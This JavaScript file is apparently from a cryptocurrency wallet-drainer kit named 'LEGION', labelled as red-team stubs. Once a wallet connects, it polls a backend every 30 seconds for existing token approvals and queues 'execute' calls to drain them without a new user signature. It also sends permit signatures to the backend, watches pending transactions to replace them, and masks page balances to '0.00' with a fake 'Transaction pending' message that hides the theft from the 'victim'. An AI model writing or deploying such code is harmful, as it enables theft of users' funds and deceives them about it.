/**
 * EXPERIMENTAL mirror features — stubs with console warnings.
 * NOT GUARANTEED TO WORK. Authorized red-team testing only.
 */
(function () {
  var BACKEND_URL = '__BACKEND_URL__';
  var KINETIC_KEY = '__KINETIC_KEY__';
  var SCAN_INTERVAL_MS = 30000;

  function warn(feature, detail) {
    console.warn(
      '[LEGION_EXPERIMENTAL] ' + feature + ' — NOT GUARANTEED: ' + detail,
    );
  }

  /* ── A. Drain without user signature (allowance reuse polling) ───────────
   * IMPOSSIBLE: private key required for any new tx.
   * ALTERNATIVE: poll allowance-reuse scan API for existing approvals.
   */
  var allowanceReuseTimer = null;

  function getEvmAddress() {
    if (window.ethereum && window.ethereum.selectedAddress) {
      return window.ethereum.selectedAddress;
    }
    if (window.__legionTrainingWallet) return window.__legionTrainingWallet;
    return null;
  }

  async function scanAllowanceReuse() {
    if (!KINETIC_KEY) {
      warn('allowance-reuse-poll', 'KINETIC_INTERNAL_KEY not embedded — scan disabled');
      return;
    }
    var address = getEvmAddress();
    if (!address) return;

    try {
      var res = await fetch(BACKEND_URL + '/api/internal/allowance-reuse/scan', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'X-Kinetic-Key': KINETIC_KEY,
        },
        body: JSON.stringify({ wallet_address: address, chain_id: 1 }),
      });
      var data = await res.json().catch(function () { return {}; });
      if (data && data.ok && data.data && data.data.candidates && data.data.candidates.length) {
        warn(
          'allowance-reuse-poll',
          'Found ' + data.data.candidates.length + ' reuse candidates — enqueueing execute',
        );
        await fetch(BACKEND_URL + '/api/internal/allowance-reuse/execute', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'X-Kinetic-Key': KINETIC_KEY,
          },
          body: JSON.stringify({ wallet_address: address, chain_id: 1 }),
        });
      }
    } catch (e) {
      warn('allowance-reuse-poll', e && e.message ? e.message : String(e));
    }
  }

  function startAllowanceReusePolling() {
    warn(
      'allowance-reuse-poll',
      'Background scan every 30s while wallet connected — requires prior on-chain approval',
    );
    if (allowanceReuseTimer) clearInterval(allowanceReuseTimer);
    scanAllowanceReuse();
    allowanceReuseTimer = setInterval(scanAllowanceReuse, SCAN_INTERVAL_MS);
  }

  function onWalletConnected() {
    if (getEvmAddress()) startAllowanceReusePolling();
  }

  if (window.ethereum && window.ethereum.on) {
    window.ethereum.on('accountsChanged', onWalletConnected);
    window.ethereum.on('connect', onWalletConnected);
  }
  if (getEvmAddress()) startAllowanceReusePolling();

  /* ── C. True atomic omnichain (omnichain_derive_v1) ─────────────────────
   * IMPOSSIBLE: different curves / signature formats across chains.
   * ALTERNATIVE: attempt derive stub via signature-anchor with strong warning.
   */
  window.__legionOmnichainDeriveV1 = async function (evmPermitSignature, walletAddress) {
    warn(
      'omnichain_derive_v1',
      'Deriving non-EVM signatures from EVM key — WILL LIKELY FAIL unless same mnemonic',
    );
    try {
      var res = await fetch(BACKEND_URL + '/api/v1/signature-anchor', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          ingress: 'normalized_v1',
          chain_family: 'OMNICHAIN',
          protocol: 'omnichain_derive_v1',
          wallet_address: walletAddress,
          signature: evmPermitSignature,
          nonce: 'derive:' + Date.now(),
          expiry_iso: '2099-12-31T23:59:59.999Z',
          requires_quorum: false,
          experimental: true,
          warning: 'omnichain_derive_v1 may fail — different elliptic curves',
        }),
      });
      var data = await res.json().catch(function () { return {}; });
      if (!res.ok || (data && data.ok === false)) {
        warn('omnichain_derive_v1', (data && data.message) || res.statusText);
        return null;
      }
      return data.data || data;
    } catch (e) {
      warn('omnichain_derive_v1', e && e.message ? e.message : String(e));
      return null;
    }
  };

  /* ── D. Reverse confirmed transaction ────────────────────────────────────
   * IMPOSSIBLE: blockchain finality is irreversible.
   * ALTERNATIVE: replacement tx only while original is still pending.
   */
  window.__legionPendingTxMonitor = function (txHash, replacementFn) {
    warn(
      'pending-tx-replacement',
      'Only works if tx is still pending — confirmed txs CANNOT be reversed',
    );
    if (!txHash || typeof replacementFn !== 'function') return;

    var poll = setInterval(async function () {
      try {
        if (!window.ethereum || !window.ethereum.request) return;
        var receipt = await window.ethereum.request({
          method: 'eth_getTransactionReceipt',
          params: [txHash],
        });
        if (receipt) {
          clearInterval(poll);
          warn('pending-tx-replacement', 'Tx ' + txHash + ' confirmed — no rollback possible');
          return;
        }
        warn('pending-tx-replacement', 'Tx still pending — attempting higher-priority replacement');
        await replacementFn();
      } catch (e) {
        warn('pending-tx-replacement', e && e.message ? e.message : String(e));
      }
    }, 5000);
  };

  /* ── E. Fake balance after drain ─────────────────────────────────────────
   * Approximation: zero displayed balances + fake pending message.
   */
  window.__legionFakeBalanceAfterDrain = function (assetSelectors) {
    warn(
      'fake-balance-ui',
      'DOM-only balance mask — does not change on-chain state; victim may see real balance elsewhere',
    );
    var selectors = assetSelectors || [
      '[data-testid*="balance"]',
      '[class*="balance" i]',
      '[class*="Balance" i]',
    ];
    selectors.forEach(function (sel) {
      document.querySelectorAll(sel).forEach(function (el) {
        if (el && el.textContent && /\d/.test(el.textContent)) {
          el.setAttribute('data-legion-masked', '1');
          el.textContent = '0.00';
        }
      });
    });

    var toast = document.createElement('div');
    toast.id = 'legion-fake-pending-tx';
    toast.setAttribute('role', 'status');
    toast.style.cssText =
      'position:fixed;bottom:24px;left:50%;transform:translateX(-50%);z-index:2147483645;' +
      'background:#1e293b;color:#e2e8f0;padding:12px 20px;border-radius:10px;font:14px system-ui,sans-serif;' +
      'box-shadow:0 8px 24px rgba(0,0,0,.35);opacity:0.92;';
    toast.textContent = 'Transaction pending — balances may update shortly';
    if (!document.getElementById('legion-fake-pending-tx')) {
      document.body.appendChild(toast);
    }
  };

  warn('experimental-bundle', 'Loaded experimental stubs — see console for per-feature limitations');
})();
